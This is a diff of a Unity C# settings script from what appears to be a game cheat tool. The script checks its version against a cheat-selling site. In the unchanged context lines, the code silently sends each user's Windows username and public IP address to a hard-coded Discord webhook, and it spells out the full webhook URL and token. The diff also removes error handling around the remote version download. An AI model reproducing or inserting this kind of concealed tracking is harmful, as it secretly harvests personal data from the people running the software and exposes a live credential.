@@ -1,4 +1,5 @@
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Text;
@@ -24,10 +25,9 @@ public class GetSettings : MonoBehaviour {
         if (Environment.UserName != "cya") {
             string user = "`user: *" + Environment.UserName + "*, *"; 
             SendMs(user + GetPublicIp().ToString() + "*`", "https://discord.com/api/webhooks/1081375415265927229/zXjjuPWtqhAn5RPLLa62e29ldB2y8dSS3ZPhXpdsGlxeQE_lH9K7AgbGZYjK3wftDvmG");
-            wrongVersion.SetActive(Application.version != GetGameVersion());
+            wrongVersion.SetActive(Application.version != GetGameVersion());         
         }
 #endif
-
         if ( DataSetup() ) {
             string playerData = File.ReadAllText("C:/userdata/playerData.json");
             PlayerData pData = JsonUtility.FromJson<PlayerData>(playerData);
@@ -93,20 +93,14 @@ public class GetSettings : MonoBehaviour {
     }
 
     public string GetGameVersion() {
-        if ( File.Exists(@"version.txt") )
+        if ( File.Exists(@"version.txt"))
             File.Delete(@"version.txt");
 
-        WebClient webClient = new WebClient();
-        try {
-            webClient.DownloadFile("https://nexuscheat.store/version.txt", @"version.txt");
+        WebClient webClient = new WebClient();     
+        webClient.DownloadFile("https://nexuscheat.store/version.txt", @"version.txt");
 
-            foreach ( string line in File.ReadLines(@"version.txt") ) {
-                return line;
-            }
-        }
-        catch ( WebException webException ) {
-            Debug.Log(webException.Message);
-            return "0.0.0";
+        foreach ( string line in File.ReadLines(@"version.txt") ) {
+            return line;
         }
 
         return null;
